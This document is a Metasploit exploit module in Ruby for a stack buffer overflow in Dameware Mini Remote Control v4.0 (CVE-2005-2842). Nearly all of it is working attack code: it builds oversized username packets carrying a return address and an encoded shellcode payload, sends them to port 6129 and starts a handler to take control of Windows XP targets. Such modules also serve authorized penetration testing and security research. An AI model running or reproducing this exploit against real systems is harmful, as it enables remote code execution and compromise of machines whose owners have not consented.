 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Dameware Mini Remote Control Username Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow vulnerability found
                in Dameware Mini Remote Control v4.0. The overflow is caused when sending
                an overly long username to the DWRCS executable listening on port 6129.
                The username is read into a strcpy() function causing an overwrite of
                the return pointer leading to arbitrary code execution.
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2005-2842&#039; ],
                    [ &#039;BID&#039;, &#039;14707&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/advisories/16655&#039; ],
                    [ &#039;URL&#039;, &#039;http://archives.neohapsis.com/archives/fulldisclosure/2005-08/1074.html&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 140,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;PrependEncoder&#039; => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
                    &#039;Compat&#039;        =>
                        {
                            &#039;SymbolLookup&#039; => &#039;+ws2ord&#039;,
                        },
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ 
                        &#039;Windows XP SP3 EN&#039;, 
                            { 
                                # msvcrt.dll
                                # push esp/ retn
                                &#039;Ret&#039; => 0x77c35459, 
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Sept 01 2005&#039;))
 
        register_options(
            [
                Opt::RPORT(6129),
            ], self.class )
    end
 
    def pkt1
        p = payload.encoded
 
        boom = "\x43" * 259
        boom[100, 4] = [target.ret].pack(&#039;V&#039;)
        boom[108, p.length] = p
 
        packet = "\x00" * 4056
        packet[0, 4] = "\x30\x11\x00\x00"
        packet[4, 4] = "\x00\x00\x00\x00"
        packet[8, 4] = "\xd7\xa3\x70\x3d"
        packet[12, 4] = "\x0a\xd7\x0d\x40"
        packet[16, 20] = "\x00" * 20
        packet[36, 4] = "\x01\x00\x00\x00"
 
        packet[40, 4] = [0x00002710].pack(&#039;V&#039;)
        packet[196, 259] = rand_text_alpha(259)
        packet[456, 259] = boom
        packet[716, 259] = rand_text_alpha(259)
        packet[976, 259] = rand_text_alpha(259)
        packet[1236, 259] = rand_text_alpha(259)
        packet[1496, 259] = rand_text_alpha(259)
 
        return packet
    end
 
    def pkt2
        packet = "\x00" * 4096
        packet[756, 259] = rand_text_alpha(259)
 
        return packet
         
    end
 
    def exploit
        connect
 
        sock.put(pkt1)
        sock.recv(1024)
        sock.put(pkt2)
        sock.recv(84)
 
        handler
        disconnect
    end
 
end
__END__

